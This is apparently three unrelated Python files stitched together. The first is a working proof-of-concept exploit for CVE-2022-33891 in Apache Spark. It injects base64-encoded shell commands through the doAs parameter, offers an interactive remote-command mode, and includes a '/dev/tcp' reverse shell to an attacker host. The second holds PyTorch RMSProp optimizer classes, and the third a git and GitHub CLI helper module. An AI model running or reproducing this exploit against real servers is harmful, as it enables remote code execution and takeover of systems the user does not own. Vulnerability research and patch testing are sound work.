from colorama import Fore

parser = argparse.ArgumentParser(description='CVE-2022-33891 Python POC Exploit Script')
parser.add_argument('-u', '--url', help='URL to exploit.', required=True)
parser.add_argument('-p', '--port', help='Exploit target\'s port.', required=True)
parser.add_argument('--revshell', default=False, action="store_true", help="Reverse Shell option.")
parser.add_argument('-lh', '--listeninghost', help='Your listening host IP address.')
parser.add_argument('-lp', '--listeningport', help='Your listening host port.')
parser.add_argument('--check', default=False, action="store_true", help="Checks if the target is exploitable with a sleep test")
parser.add_argument('--verbose', default=False, action="store_true", help="Verbose mode")

args = parser.parse_args()

# nothing to see here, move along!
headers = {
    'User-Agent': 'CVE-2022-33891 POC',
}

# Colors :D
info = (Fore.BLUE + "[*] " + Fore.RESET)
recc = (Fore.YELLOW + "[*] " + Fore.RESET)
good = (Fore.GREEN + "[+] " + Fore.RESET)
important = (Fore.CYAN + "[!] " + Fore.RESET)
printError = (Fore.RED + "[X] " + Fore.RESET)

full_url = "{}:{}".format(args.url, args.port)


def check_for_vuln(url):
    try:
        print(info + "Attempting to connect to site...")
        r = requests.get("{}/?doAs='testing'".format(url), allow_redirects=False, headers=headers)
        if args.verbose:
            print(info + "URL request: {}/?doAs='testing'".format(url))
            print(info + "Response status code: {}".format(r.status_code))
        if r.status_code != 403:
            print(printError + "No ?doAs= endpoint. Does not look vulnerable.")
            quit(1)
        elif "org.apache.spark.ui" not in r.content.decode("utf-8"):
            print(printError + "Does not look like an Apache Spark server.")
            quit(1)
        else:
            print(important + "Performing sleep test of 10 seconds...")
            t1 = datetime.datetime.now()
            if args.verbose:
                print(info + "T1: {}".format(t1))
            run_cmd("sleep 10")
            t2 = datetime.datetime.now()
            delta = t2-t1
            if args.verbose:
                print(info + "T2: {}".format(t2))
                print(info + "Delta T: {}".format(delta.seconds))
            if delta.seconds not in range(8,12):
                print(printError + "Sleep was less than 10. This target is probably not vulnerable")
            else:
                print(good + "Sleep was 10 seconds! This target is probably vulnerable!")
            exit(0)
    except Exception as e:
        print(printError + str(e))


def cmd_prompt():
    cmd = input("[cve-2022-33891> ")
    return cmd


def base64_encode(cmd):
    try:
        message_bytes = cmd.encode('ascii')
        base64_bytes = base64.b64encode(message_bytes)
        base64_cmd = base64_bytes.decode('ascii')
        return base64_cmd
    except Exception as e:
        print(printError +str(e))


def run_cmd(cmd):
    try:
        if args.verbose:
            print(info + "Command is: " + cmd)
        base64_cmd = base64_encode(cmd)
        if args.verbose:
            print(info + "Base64 command is: " + base64_cmd)
        exploit = "/?doAs=`echo {} | base64 -d | bash`".format(base64_cmd)
        exploit_req = "{}{}".format(full_url, exploit)
        if args.verbose:
            print(info + "Full exploit request is: " + exploit_req)
            print(info + "Sending exploit...")
        r = requests.get(exploit_req, allow_redirects=False, headers=headers)
        if args.verbose:
            print(info + "Response status code: {}
".format(r.status_code)+ info + "Hint: 403 is good.")
    except Exception as e:
        print(printError + str(e))
        quit(1)


def revshell(lhost, lport):
    print(info + "Reverse shell mode.
" + recc+ "Set up your listener by entering the following:
nc -nvlp {}".format(lport))
    input(recc + "When your listener is set up, press enter!")
    rev_shell_cmd = "sh -i >& /dev/tcp/{}/{} 0>&1".format(lhost, lport)
    run_cmd(rev_shell_cmd)


def main():
    try:
        if args.check and args.revshell:
            print(printError + "Please choose either revshell or check!")
            exit(1)

        elif args.check:
            check_for_vuln(full_url)

        # Revshell
        elif args.revshell:
            if not (args.listeninghost and args.listeningport):
                print(printError + "You need --listeninghost and --listeningport!")
                exit(1)
            else:
                lhost = args.listeninghost
                lport = args.listeningport
                revshell(lhost, lport)
        else:
            # "Interactive" mode
            print(info + "\"Interactive\" mode!\n" + important + "Note: you will not receive any output from these commands. Try using something like ping or sleep to test for execution.")
            while True:
                command_to_run = cmd_prompt()
                run_cmd(command_to_run)
    except KeyboardInterrupt:
        print("\n"+ info + "Goodbye!")


if __name__ == "__main__":
    main()

from typing import Any
import torch


# https://www.geeksforgeeks.org/gradient-descent-with-rmsprop-from-scratch/
class RMSProp(torch.optim.Optimizer): 
    def __init__(self, params, lr=1e-3, alpha=0.9):
        defaults = dict(lr=lr, alpha=alpha)
        self.lr = lr
        self.alpha = alpha
        super().__init__(params, defaults) 

    def step(self, closure=None): 
        if closure is not None: 
            with torch.enable_grad(): 
                closure()

        for group in self.param_groups: 
            for p in group['params']: 
                if p.grad is None: 
                    continue

                param_state = self.state[p]
                if "acc_square_avg" not in param_state:
                    param_state["acc_square_avg"] = torch.zeros_like(p.grad.data)
                    print("Hey, new parameter")

                param_state["acc_square_avg"] = param_state["acc_square_avg"]*self.alpha + (1-self.alpha)*(p.grad.data ** 2)
                p.data.add_(p.grad / (torch.sqrt(param_state["acc_square_avg"]) + 1e-8),alpha=-group['lr'])



# Assisted with basic coding tools
class GPTRMSProp(torch.optim.Optimizer):
    def __init__(self, params, lr=1e-3, alpha=0.99, eps=1e-8):
        defaults = dict(lr=lr, alpha=alpha, eps=eps)
        super().__init__(params, defaults)

    def step(self, closure=None):
        if closure is not None:
            with torch.enable_grad():
                closure()

        for group in self.param_groups:
            for p in group['params']:
                if p.grad is None:
                    continue

                param_state = self.state[p]
                if "acc_square_avg" not in param_state:
                    param_state["acc_square_avg"] = torch.zeros_like(p.data)

                grad = p.grad.data
                acc_square_avg = param_state["acc_square_avg"]
                alpha = group["alpha"]
                eps = group["eps"]
                lr = group["lr"]

                # Update the accumulated squared gradients
                acc_square_avg.mul_(alpha).addcmul_(1 - alpha, grad, grad)

                # Update the parameters
                p.data.addcdiv_(grad, torch.sqrt(acc_square_avg) + eps, value=-lr)

"""gogo-git.py

Author: Copilot (GitHub Copilot, OpenAI, and contributors)
Attribution: Generated with the help of GitHub Copilot and OpenAI's GPT models. Thanks to the authors of GitPython and the open-source community.

An object-oriented, importable Python module for managing git repositories, executing git commands with logging, 
and now also managing checks for gh CLI and Copilot CLI.
"""
import os
import subprocess
import shutil
import logging
from typing import List, Optional

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")

class GoGoGitError(Exception):
    pass

class GoGoGit:
    def __init__(self, repo_path):
        if not self.is_git_installed():
            raise GoGoGitError("git is not installed or not found in PATH.")
        self.repo_path = repo_path
        if not os.path.exists(self.repo_path):
            os.makedirs(self.repo_path, exist_ok=True)
        if not self.is_git_repo():
            logging.info("{} is not a git repository.".format(self.repo_path))
        else:
            logging.info("Initialized GoGoGit for repository at {}".format(self.repo_path))

    @staticmethod
    def is_git_installed() :
        try:
            subprocess.check_output(["git", "--version"])
            return True
        except (subprocess.CalledProcessError, FileNotFoundError):
            return False

    @staticmethod
    def is_gh_installed() :
        return shutil.which("gh") is not None

    @staticmethod
    def is_gh_copilot_installed() :
        try:
            output = subprocess.check_output(["gh", "extension", "list"], text=True)
            return "copilot" in output
        except Exception:
            return False

    @staticmethod
    def is_gh_authenticated() :
        try:
            result = subprocess.run(
                ["gh", "auth", "status"],
                capture_output=True,
                text=True,
                check=True,
            )
            return "Logged in to github.com" in result.stdout
        except subprocess.CalledProcessError:
            return False

    def _run_git(self, args, check = True, capture_output = False) :
        logging.info("Running git command: git {}".format(' '.join(args)))
        return subprocess.run(
            ["git"] + args,
            cwd=self.repo_path,
            check=check,
            capture_output=capture_output,
            text=True
        )

    def is_git_repo(self) :
        try:
            self._run_git(["rev-parse", "--is-inside-work-tree"], capture_output=True)
            return True
        except subprocess.CalledProcessError:
            return False

    def is_clean(self) :
        """Check if the repository is clean (no uncommitted changes)."""
        result = self._run_git(["status", "--porcelain"], capture_output=True)
        return result.stdout.strip() == ""

    def ensure_cloned(self, org, repo_name, base_dir) :
        """Ensure that DIR/org/repo_name exists as a git repo, cloning if necessary."""
        repo_path = os.path.join(base_dir, org, repo_name)
        if not os.path.exists(repo_path):
            os.makedirs(os.path.dirname(repo_path), exist_ok=True)
            logging.info("Cloning repository {}/{} into {}".format(org, repo_name, repo_path))
            subprocess.check_call(
                ["git", "clone", "git@github.com:{}/{}.git".format(org, repo_name), repo_path]
            )
        elif not os.path.exists(os.path.join(repo_path, ".git")):
            raise GoGoGitError("{} exists but is not a git repository.".format(repo_path))
        return repo_path

    def switch_or_create_branch(self, branch, push = False):
        """Switch to a branch, or create it (and optionally push to origin) if it doesn't exist."""
        try:
            self._run_git(["checkout", branch])
        except subprocess.CalledProcessError:
            logging.info("Branch {} does not exist. Creating it.".format(branch))
            self._run_git(["checkout", "-b", branch])
            if push:
                self._run_git(["push", "--set-upstream", "origin", branch])

    def add_commit_push(self, files, message, push = False):
        """Add files, commit with message, and optionally push to origin."""
        self._run_git(["add"] + files)
        self._run_git(["commit", "-m", message])
        if push:
            self._run_git(["push"])

    def branch_exists(self, branch) :
        try:
            self._run_git(["show-ref", "--verify", "refs/heads/{}".format(branch)], capture_output=True)
            return True
        except subprocess.CalledProcessError:
            return False

    def assert_gh_ready(self):
        if not GoGoGit.is_gh_installed():
            raise GoGoGitError("GitHub CLI (gh) is not installed.")
        if not GoGoGit.is_gh_copilot_installed():
            raise GoGoGitError("GitHub Copilot CLI extension is not installed.")
        if not GoGoGit.is_gh_authenticated():
            raise GoGoGitError(
                "No valid GitHub CLI access token detected.\n"
                "To use GitHub Copilot in the CLI, you must authenticate the GitHub CLI using a personal access token (PAT).\n"
                "Follow these steps:\n"
                "1. Visit https://github.com/settings/tokens?type=beta\n"
                "2. Generate a new fine-grained personal access token with these scopes: 'repo', 'read:org', and 'copilot'.\n"
                "3. Save the token into a file, e.g. 'token.txt'.\n"
                "4. Authenticate with the GitHub CLI by running:\n"
                "    gh auth login --with-token < token.txt\n"
                "5. After authenticating, re-run this script.\n"
                "For more info, see: https://cli.github.com/manual/gh_auth_login\n"
            )

    def apply_patch(self, patch_file):
        """Apply a patch file to the repository using git apply."""
        logging.info("Applying patch file: {}".format(patch_file))
        return self._run_git(['apply', patch_file])

